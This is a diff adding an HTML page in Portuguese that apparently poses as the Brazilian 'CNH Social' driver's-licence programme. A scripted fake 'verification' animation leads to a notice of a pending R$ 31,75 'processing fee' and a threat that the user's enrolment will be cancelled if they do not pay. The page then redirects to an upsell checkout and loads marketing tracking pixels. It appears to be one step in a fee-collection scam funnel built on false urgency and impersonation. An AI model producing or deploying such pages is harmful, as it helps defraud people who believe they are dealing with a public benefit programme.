@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "69004dfc4831eecd3cbc3843";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CNH Social - Validação Pendente</title>
+    <script>
+        localStorage.setItem("upsell", "up5");
+        </script>
+        <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #eef2f3;
+        }
+
+        .header {
+            background-color: #004080;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header img {
+            width: 65%;
+            padding: 0%;
+            margin-bottom: 0%;
+            margin-top: -5%;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100vh - 100px);
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #002776, #0044cc);
+            color: white;
+        }
+
+        .container h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            margin-top: -35%;
+            font-weight: bold;
+        }
+
+        .loading {
+            font-size: 18px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading span {
+            margin-left: 10px;
+            font-weight: bold;
+        }
+
+        .loading-bar {
+            width: 80%;
+            height: 8px;
+            background-color: #cce5ff;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .loading-bar div {
+            height: 100%;
+            width: 0;
+            background-color: #ffcc00;
+            animation: loading 6s linear forwards;
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        .container p {
+            font-size: 18px;
+            margin: 15px 0;
+        }
+
+        .container .highlight {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+
+        .action {
+            margin-top: 30px;
+            display: none;
+        }
+
+        .action button {
+            background-color: #ffcc00;
+            color: #002776;
+            border: none;
+            padding: 15px 25px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .action button:hover {
+            background-color: #ffd633;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #cce5ff;
+        }
+
+        .footer strong {
+            color: #ffcc00;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const container = document.querySelector(".container");
+            const actionSection = document.querySelector(".action");
+            const loadingBar = document.querySelector(".loading-bar div");
+            const loadingElements = document.querySelectorAll(".loading, .loading-bar");
+            let step = 0;
+
+            const steps = [
+                "Verificando inscrição...",
+                "Analisando elegibilidade...",
+                "Validação pendente!"
+            ];
+
+            const interval = setInterval(() => {
+                if (step < steps.length) {
+                    container.querySelector("h1").textContent = steps[step];
+                    step++;
+                } else {
+                    clearInterval(interval);
+                    container.querySelector("h1").textContent = "⚠️ Taxa CNH Social Pendente!";
+                    loadingElements.forEach(el => el.style.display = "none");
+                    actionSection.style.display = "block";
+                }
+            }, 2000);
+
+    
+            loadingBar.style.animationPlayState = 'running';
+        });
+    </script>
+</head>
+
+<body>
+
+    <div class="header">
+        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo CNH Social">
+    </div>
+
+    <div class="container">
+        <h1>⚠️ Verificando...</h1>
+        <div class="loading">
+            <span>Processando inscrição CNH Social...</span>
+        </div>
+        <div class="loading-bar">
+            <div></div>
+        </div>
+
+        <div class="action">
+            <p>Identificamos uma pendência relacionada à sua inscrição no <span class="highlight">programa CNH Social</span>.</p>
+            <p>Para finalizar o processo, é necessário efetuar o pagamento da <span class="highlight">Taxa de Processamento</span>.
+            </p>
+            <p>O valor promocional é de <span class="highlight">R$ 31,75</span>. Após o pagamento, sua CNH Social será liberada
+                imediatamente!</p>
+
+            <div class="cta">
+                <button onclick="checkout(event)">FINALIZAR CNH SOCIAL</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o cancelamento definitivo da sua inscrição no programa.
+        </div>
+    </div>
+    <script>
+        function checkout(event) {
+            event.preventDefault();
+            var currentUrlParams = window.location.search;
+            window.location.href = "/cnh/checkoutup4/index.html?from_upsell=4&valor=3175" + currentUrlParams;
+        }
+    </script>
+
+
+</body></html>
